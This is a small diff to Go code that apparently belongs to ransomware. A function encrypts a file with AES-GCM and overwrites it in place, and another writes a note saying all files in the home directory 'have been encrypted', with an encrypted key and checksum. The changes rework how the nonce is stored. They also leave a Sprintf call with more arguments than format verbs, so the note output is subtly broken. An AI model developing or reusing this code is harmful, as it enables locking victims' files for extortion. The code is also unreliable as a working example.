@@ -142,8 +142,9 @@ func encryptFile(path string) {
 		os.Exit(1)
 	}
 
-	enc := gcm.Seal(nonce, nonce, data, nil)
-	err = os.WriteFile(path, enc, 0777)
+	enc := gcm.Seal(nil, nonce, data, nil)
+	d := append(nonce, enc...)
+	err = os.WriteFile(path, d, 0777)
 	if err != nil {
 		fmt.Println(err)
 	}
@@ -173,7 +174,7 @@ func writeNote(shaSum string, hexKey string) {
 	}
 	defer n.Close()
 	home, _ := os.UserHomeDir()
-	s := fmt.Sprintf("All files in %s have been encrypted.\nEncrypted key: %s \nSha256Sum: %s", home, hexKey, shaSum)
+	s := fmt.Sprintf("\nEncrypted key: %s \nSha256Sum: %s", home, hexKey, shaSum)
 	_, err = n.WriteString(s)
 	if err != nil {
 		fmt.Println("Error writing file: ", err)
